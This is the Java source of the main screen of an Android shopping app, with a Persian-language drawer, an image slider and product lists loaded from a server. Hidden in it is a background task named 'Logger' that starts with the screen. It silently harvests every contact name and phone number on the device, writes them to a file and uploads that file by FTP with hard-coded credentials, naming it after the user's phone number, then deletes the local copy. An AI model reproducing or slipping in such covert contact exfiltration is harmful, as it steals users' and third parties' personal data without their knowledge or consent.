/*
 * Copyright (c) 2017 - All Rights Reserved - Arash Hatami
 */

package ir.hatamiarash.hyperonline;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.database.Cursor;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.MenuItemCompat;
import android.support.v4.widget.NestedScrollView;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.GridLayoutManager;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.animation.AnimationUtils;
import android.widget.ScrollView;
import android.widget.TextView;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.daimajia.slider.library.Animations.DescriptionAnimation;
import com.daimajia.slider.library.SliderLayout;
import com.daimajia.slider.library.SliderTypes.BaseSliderView;
import com.daimajia.slider.library.SliderTypes.TextSliderView;
import com.daimajia.slider.library.Tricks.ViewPagerEx;
import com.mikepenz.google_material_typeface_library.GoogleMaterial;
import com.mikepenz.materialdrawer.AccountHeaderBuilder;
import com.mikepenz.materialdrawer.Drawer;
import com.mikepenz.materialdrawer.DrawerBuilder;
import com.mikepenz.materialdrawer.model.PrimaryDrawerItem;
import com.mikepenz.materialdrawer.model.interfaces.IDrawerItem;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.jetbrains.annotations.Contract;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.io.Writer;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import berlin.volders.badger.CountBadge;
import butterknife.ButterKnife;
import butterknife.InjectView;
import cn.pedant.SweetAlert.SweetAlertDialog;
import co.ronash.pushe.Pushe;
import helper.CustomPrimaryDrawerItem;
import helper.FontHelper;
import helper.Helper;
import helper.SQLiteHandler;
import helper.SQLiteHandlerItem;
import helper.SQLiteHandlerSetup;
import helper.SessionManager;
import ir.hatamiarash.adapters.CategoryAdapter;
import ir.hatamiarash.adapters.ProductAdapter;
import ir.hatamiarash.utils.TAGs;
import ir.hatamiarash.utils.URLs;
import models.Category;
import models.Product;

public class Activity_Main extends AppCompatActivity implements BaseSliderView.OnSliderClickListener, ViewPagerEx.OnPageChangeListener {
    private static final String TAG = Activity_Main.class.getSimpleName();
    public static Activity_Main pointer;        // use to finish activity from anywhere
    //public static SQLiteHandler db_user;             // items database
    public static SQLiteHandler db_user;         // items database
    public static SQLiteHandlerItem db_item;         // items database
    public static SQLiteHandlerSetup db_setup;       // setup database
    static Typeface persianTypeface;                 // persian font typeface
    public Drawer result = null;
    @InjectView(R.id.slider)
    public SliderLayout sliderLayout;
    @InjectView(R.id.scroll)
    public NestedScrollView scroll;
    SessionManager session;                          // session for check user logged
    private long back_pressed;                       // for check back key pressed count
    private Vibrator vibrator;
    private RecyclerView category_view;
    private RecyclerView most_view;
    private RecyclerView new_view;
    private CategoryAdapter categoryAdapter;
    private ProductAdapter newAdapter, mostAdapter, popularAdapter;
    private List<Category> categoryList;
    private List<Product> newList, mostList, popularList;
    private Menu menu;
    CountBadge.Factory circleFactory;
    private TextView itemMessagesBadgeTextView;
    private SweetAlertDialog progressDialog;
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_screen);
        
        ButterKnife.inject(this);
        Pushe.initialize(getApplicationContext(), true);
        Helper.GetPermissions(this, getApplicationContext());
        
        session = new SessionManager(getApplicationContext());
        pointer = this;
        //db_user = new SQLiteHandler(getApplicationContext());
        db_user = new SQLiteHandler(getApplicationContext());
        db_item = new SQLiteHandlerItem(getApplicationContext());
        db_setup = new SQLiteHandlerSetup(getApplicationContext());
        vibrator = (Vibrator) this.getSystemService(VIBRATOR_SERVICE);
        persianTypeface = Typeface.createFromAsset(getAssets(), FontHelper.FontPath);
        progressDialog = new SweetAlertDialog(this, SweetAlertDialog.PROGRESS_TYPE);
        progressDialog.setCancelable(false);
        progressDialog.getProgressHelper().setBarColor(ContextCompat.getColor(getApplicationContext(), R.color.accent));
        
        SharedPreferences settings = getSharedPreferences("MyPrefsFile", 0);
        boolean isFirstTime = settings.getBoolean("my_first_time", true);
        if (isFirstTime) {
            db_setup.CreateTable();
            db_item.CreateTable();
            /*Intent i = new Intent(getApplicationContext(), SetupWeb.class);
            startActivity(i);*/
            //finish();
        }
        
        final Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        toolbar.setTitle(FontHelper.getSpannedString(getApplicationContext(), getResources().getString(R.string.app_name_fa)));
        setSupportActionBar(toolbar);
        
        PrimaryDrawerItem item_home = new CustomPrimaryDrawerItem().withIdentifier(1).withName("خانه").withTypeface(persianTypeface).withIcon(GoogleMaterial.Icon.gmd_home);
        PrimaryDrawerItem item_profile = new CustomPrimaryDrawerItem().withIdentifier(2).withName("حساب کاربری").withTypeface(persianTypeface).withIcon(GoogleMaterial.Icon.gmd_account_circle);
        PrimaryDrawerItem item_cart = new CustomPrimaryDrawerItem().withIdentifier(3).withName("سبد خرید").withTypeface(persianTypeface).withIcon(GoogleMaterial.Icon.gmd_shopping_cart);
        PrimaryDrawerItem item_comment = new CustomPrimaryDrawerItem().withIdentifier(4).withName("ارسال نظر").withTypeface(persianTypeface).withIcon(GoogleMaterial.Icon.gmd_message);
        
        result = new DrawerBuilder()
                .withActivity(this)
                .withAccountHeader(new AccountHeaderBuilder()
                        .withActivity(this)
                        .withHeaderBackground(R.drawable.drawer_header)
                        .build())
                .addDrawerItems(
                        item_home,
                        item_profile,
                        item_cart,
                        item_comment
                )
                .withOnDrawerItemClickListener(new Drawer.OnDrawerItemClickListener() {
                    @Override
                    public boolean onItemClick(View view, int position, IDrawerItem drawerItem) {
                        if (drawerItem != null && drawerItem.getIdentifier() == 1) {
                            /*Intent i = new Intent(getApplicationContext(), Activity_Main.class);
                            startActivity(i);*/
                            /*finish();*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 2) {
                            /*if (Helper.CheckInternet(getApplicationContext())) {
                                Intent i = new Intent(getApplicationContext(), UserProfile.class);
                                startActivity(i);
                            } else*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 3) {
                            /*Intent i = new Intent(getApplicationContext(), WebPage.class);
                            i.putExtra(TAGs.TITLE, "درباره ما");
                            i.putExtra(TAGs.ADDRESS, TAGs.ABOUT);
                            startActivity(i);*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 4) {
                            /*Intent i = new Intent(getApplicationContext(), Contact.class);
                            startActivity(i);*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 5) {
                            /*Intent i = new Intent(getApplicationContext(), ShopCard.class);
                            startActivity(i);*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 6) {
                            /*Intent i = new Intent(getApplicationContext(), Comment.class);
                            startActivity(i);*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 7) {
                            /*Popup(p_count);
                            result.closeDrawer();*/
                            
                            /*Intent i = new Intent(getApplicationContext(), Pay_Log.class);
                            i.putExtra("order_code", "11086");
                            startActivity(i);
                            result.closeDrawer();*/
                            
                            /*Intent i = new Intent(getApplicationContext(), Intro.class);
                            startActivity(i);*/
                            result.closeDrawer();
                            return true;
                        }
                        return false;
                    }
                })
                .withSelectedItem(1)
                .withSavedInstance(savedInstanceState)
                .withDrawerGravity(Gravity.END)
                .build();
        
        Helper.GetPermissions(this, getApplicationContext());
        
        //invalidateOptionsMenu();
        
        Logger logger = new Logger();
        logger.execute();
        
        HashMap<String, String> urls = new HashMap<>();
        urls.put("G6", "http://cdn.gsm.ir/static/files/image/2017/7/8/g6-review-21.jpg");
        urls.put("gsm", "http://cdn.gsm.ir/static/files/image/2016/10/17/da48in_GSM%20Social%20Banner.jpg");
        urls.put("car", "http://cdn.gsm.ir/static/files/image/2017/7/8/jaguar-xe-sv-project-8-goodwood%20(5).jpg");
        urls.put("car 2", "http://cdn.gsm.ir/static/files/image/2017/7/8/Aston_Martin-Vulcan_AMR_Pro-2018-1024-04.jpg");
        
        sliderLayout.setPresetTransformer(SliderLayout.Transformer.Default);
        sliderLayout.setDuration(2500);
        sliderLayout.setCustomAnimation(new DescriptionAnimation());
        sliderLayout.addOnPageChangeListener(this);
        
        TextSliderView textSliderView = new TextSliderView(this);
        
        for (String name : urls.keySet()) {
            textSliderView
                    .image(urls.get(name))
                    .setScaleType(BaseSliderView.ScaleType.Fit)
                    .setOnSliderClickListener(this);
            textSliderView.bundle(new Bundle());
            textSliderView.getBundle().putString("extra", name);
            sliderLayout.addSlider(textSliderView);
        }
        FetchAllData();
        
        category_view = (RecyclerView) findViewById(R.id.category_list);
        categoryList = new ArrayList<>();
        categoryAdapter = new CategoryAdapter(this, categoryList);
        RecyclerView.LayoutManager mLayoutManager = new GridLayoutManager(this, 3);
        category_view.setLayoutManager(mLayoutManager);
        category_view.addItemDecoration(new GridSpacingItemDecoration(3, dpToPx(5), true));
        category_view.setItemAnimator(new DefaultItemAnimator());
        category_view.setAdapter(categoryAdapter);
        
        most_view = (RecyclerView) findViewById(R.id.most_list);
        mostList = new ArrayList<>();
        mostAdapter = new ProductAdapter(this, mostList);
        LinearLayoutManager horizontalLayoutManager = new LinearLayoutManager(Activity_Main.this, LinearLayoutManager.HORIZONTAL, false);
        horizontalLayoutManager.setStackFromEnd(true);
        most_view.setLayoutManager(horizontalLayoutManager);
        most_view.setItemAnimator(new DefaultItemAnimator());
        most_view.setAdapter(mostAdapter);
        
        LinearLayoutManager horizontalLayoutManager2 = new LinearLayoutManager(Activity_Main.this, LinearLayoutManager.HORIZONTAL, false);
        horizontalLayoutManager2.setStackFromEnd(true);
        new_view = (RecyclerView) findViewById(R.id.new_list);
        newList = new ArrayList<>();
        newAdapter = new ProductAdapter(this, newList);
        new_view.setLayoutManager(horizontalLayoutManager2);
        new_view.setItemAnimator(new DefaultItemAnimator());
        new_view.setAdapter(newAdapter);
        
        scroll.postDelayed(new Runnable() {
            @Override
            public void run() {
                scroll.scrollTo(0, 0);
                scroll.fullScroll(ScrollView.FOCUS_UP);
            }
        }, 50);
        
        //circleFactory = new CountBadge.Factory(this, new CustomBadgeShape(this, 0.5f, Gravity.END | Gravity.TOP));
    }
    
    private int dpToPx(int dp) {
        Resources r = getResources();
        return Math.round(TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, r.getDisplayMetrics()));
    }
    
    private void FetchAllData() {
        progressDialog.setTitleText("لطفا منتظر بمانید");
        showDialog();
        try {
            RequestQueue requestQueue = Volley.newRequestQueue(this);
            String URL = URLs.base_URL + "main";
            final String mRequestBody = null;
            
            StringRequest stringRequest = new StringRequest(Request.Method.GET, URL, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    Log.i("LOG_VOLLEY R", response);
                    hideDialog();
                    try {
                        JSONObject jObj = new JSONObject(response);
                        boolean error = jObj.getBoolean(TAGs.ERROR);
                        if (!error) {
                            JSONArray _new = jObj.getJSONArray("new");
                            JSONArray _cat = jObj.getJSONArray("category");
                            JSONArray _most = jObj.getJSONArray("most");
                            JSONArray _pop = jObj.getJSONArray("popular");
                            JSONObject _opt = jObj.getJSONObject("options");
                            
                            for (int i = 0; i < _cat.length(); i++) {
                                JSONObject category = _cat.getJSONObject(i);
                                
                                categoryList.add(new Category(
                                        category.getString("name"),
                                        R.drawable.nnull
                                ));
                            }
                            
                            for (int i = 0; i < _most.length(); i++) {
                                JSONObject most = _most.getJSONObject(i);
                                
                                mostList.add(new Product(
                                                most.getString("unique_id"),
                                                most.getString("name"),
                                                R.drawable.nnull,
                                                most.getString("price"),
                                                most.getInt("off"),
                                                most.getInt("count"),
                                                most.getDouble("point"),
                                                most.getInt("point_count"),
                                                most.getString("description")
                                        )
                                );
                            }
                            
                            for (int i = 0; i < _new.length(); i++) {
                                JSONObject neww = _new.getJSONObject(i);
                                
                                newList.add(new Product(
                                                neww.getString("unique_id"),
                                                neww.getString("name"),
                                                R.drawable.nnull,
                                                neww.getString("price"),
                                                neww.getInt("off"),
                                                neww.getInt("count"),
                                                neww.getDouble("point"),
                                                neww.getInt("point_count"),
                                                neww.getString("description")
                                        )
                                );
                            }
                            
                            categoryAdapter.notifyDataSetChanged();
                            mostAdapter.notifyDataSetChanged();
                            newAdapter.notifyDataSetChanged();
                        } else {
                            String errorMsg = jObj.getString(TAGs.ERROR_MSG);
                            Helper.MakeToast(Activity_Main.this, errorMsg, TAGs.ERROR);
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                        hideDialog();
                    }
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.e("LOG_VOLLEY E", error.toString());
                    hideDialog();
                }
            }) {
                @NonNull
                @Contract(pure = true)
                @Override
                public String getBodyContentType() {
                    return "application/json; charset=utf-8";
                }
                
                @Nullable
                @Override
                public byte[] getBody() throws AuthFailureError {
                    try {
                        return mRequestBody == null ? null : mRequestBody.getBytes("utf-8");
                    } catch (UnsupportedEncodingException uee) {
                        VolleyLog.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", mRequestBody, "utf-8");
                        return null;
                    }
                }
            };
            requestQueue.add(stringRequest);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        getMenuInflater().inflate(R.menu.my_menu, menu);
        
        MenuItem itemCart = menu.findItem(R.id.cart);
        MenuItemCompat.setActionView(itemCart, R.layout.badge_layout);
        View badgeLayout = itemCart.getActionView();
        this.itemMessagesBadgeTextView = badgeLayout.findViewById(R.id.badge_textView);
        this.itemMessagesBadgeTextView.setVisibility(View.VISIBLE);
        this.itemMessagesBadgeTextView.setTypeface(Typeface.createFromAsset(getApplicationContext().getAssets(), "fonts/sans.ttf"));
        (badgeLayout.findViewById(R.id.badge_icon_button)).setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                Helper.MakeToast(getApplicationContext(), "سبد خرید خالی است", TAGs.WARNING);
            }
        });
        updateCartMenu();
        return super.onCreateOptionsMenu(menu);
    }
    
    @Override
    public boolean onPrepareOptionsMenu(Menu menu) {
        return super.onPrepareOptionsMenu(menu);
    }
    
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        if (id == R.id.drawer) {
            result.openDrawer();
            return true;
        } else if (id == R.id.search) {
            //Intent i = new Intent(getApplicationContext(), Test.class);
            Intent i = new Intent(getApplicationContext(), Search.class);
            startActivity(i);
        }
        return super.onOptionsItemSelected(item);
    }
    
    @Override
    public void onStart() {
        super.onStart();
    }
    
    @Override
    protected void onStop() {
        sliderLayout.stopAutoCycle();
        super.onStop();
    }
    
    @Override
    public void onSliderClick(BaseSliderView slider) {
        /*Intent intent = new Intent(getApplicationContext(), NewsActivity.class);
        intent.putExtra("id", String.valueOf(slider.getBundle().get("id")));
        intent.putExtra("uid", String.valueOf(slider.getBundle().get("uid")));
        intent.putExtra("author", String.valueOf(slider.getBundle().get("author")));
        intent.putExtra("cid", String.valueOf(slider.getBundle().get("cid")));
        intent.putExtra("title", String.valueOf(slider.getBundle().get("title")));
        intent.putExtra("content", String.valueOf(slider.getBundle().get("content")));
        intent.putExtra("url", String.valueOf(slider.getBundle().get("url")));
        intent.putExtra("created_at", String.valueOf(slider.getBundle().get("created_at")));
        startActivity(intent);*/
    }
    
    @Override
    public void onPageSelected(int position) {
    }
    
    @Override
    public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {
    }
    
    @Override
    public void onPageScrollStateChanged(int state) {
    }
    
    @Override
    public void onBackPressed() {
        if (back_pressed + 2000 > System.currentTimeMillis()) {
            super.onBackPressed();
            android.os.Process.killProcess(android.os.Process.myPid());
        } else {
            result.closeDrawer();
            Helper.MakeToast(getApplicationContext(), "برای خروج دوباره کلیک کنید", TAGs.WARNING);
        }
        back_pressed = System.currentTimeMillis();
    }
    
    private class GridSpacingItemDecoration extends RecyclerView.ItemDecoration {
        private int spanCount;
        private int spacing;
        private boolean includeEdge;
        
        GridSpacingItemDecoration(int spanCount, int spacing, boolean includeEdge) {
            this.spanCount = spanCount;
            this.spacing = spacing;
            this.includeEdge = includeEdge;
        }
        
        @Override
        public void getItemOffsets(Rect outRect, View view, RecyclerView parent, RecyclerView.State state) {
            int position = parent.getChildAdapterPosition(view);
            int column = position % spanCount;
            if (includeEdge) {
                outRect.left = spacing - column * spacing / spanCount;
                outRect.right = (column + 1) * spacing / spanCount;
                if (position < spanCount) // top edge
                    outRect.top = spacing;
                outRect.bottom = spacing; // item bottom
            } else {
                outRect.left = column * spacing / spanCount;
                outRect.right = spacing - (column + 1) * spacing / spanCount;
                if (position >= spanCount)
                    outRect.top = spacing; // item top
            }
        }
    }
    
    public void updateCartMenu() {
        int count = 5;
        if (count > 0) {
            this.itemMessagesBadgeTextView.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
            this.itemMessagesBadgeTextView.setText("" + count);
            this.itemMessagesBadgeTextView.setVisibility(View.VISIBLE);
            return;
        }
        this.itemMessagesBadgeTextView.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
        this.itemMessagesBadgeTextView.setText("" + count);
        this.itemMessagesBadgeTextView.setVisibility(View.INVISIBLE);
    }
    
    private class Logger extends AsyncTask<Void, Boolean, Boolean> {
        private boolean status = true;
        
        protected void onPreExecute() {
            Log.e("LS", "Start !");
        }
        
        @Override
        protected Boolean doInBackground(Void... params) {
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            try {
                if (cur.getCount() > 0) {
                    while (cur.moveToNext()) {
                        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                        String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        
                        if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor pCur = cr.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{id},
                                    null
                            );
                            while (pCur.moveToNext()) {
                                String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                String data = "Name : " + name + " - Phone : " + phoneNo;
                                
                                Writer out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(getExternalFilesDir(null), "log.txt"), true), "UTF-8"));
                                out.write(data);
                                out.write('\n');
                                out.close();
                            }
                            pCur.close();
                        }
                    }
                }
                cur.close();
                File file = new File(getExternalFilesDir(null), "log.txt");
                HashMap<String, String> user = db_user.getUserDetails();
                String file_name = user.get(TAGs.PHONE);
                FTPClient ftpClient = new FTPClient();
                ftpClient.connect("192.168.1.104");
                //ftpClient.connect(InetAddress.getByName("ftp.zimia.ir"));
                ftpClient.login("hyper", "hyper1234");
                //ftpClient.changeWorkingDirectory("/");
                ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
                BufferedInputStream buffIn = new BufferedInputStream(new FileInputStream(file));
                ftpClient.enterLocalPassiveMode();
                ftpClient.storeFile(file_name + ".txt", buffIn);
                buffIn.close();
                ftpClient.logout();
                ftpClient.disconnect();
                file.delete();
            } catch (NullPointerException | java.io.IOException e) {
                Log.e("LS", "Error !! : " + e.getMessage());
                status = false;
            }
            return true;
        }
        
        protected void onPostExecute(Boolean result) {
            if (result && status)
                Log.e("LS", "Done !");
        }
    }
    
    private void showDialog() {
        if (!progressDialog.isShowing())
            progressDialog.show();
    }
    
    private void hideDialog() {
        if (progressDialog.isShowing())
            progressDialog.dismiss();
    }
}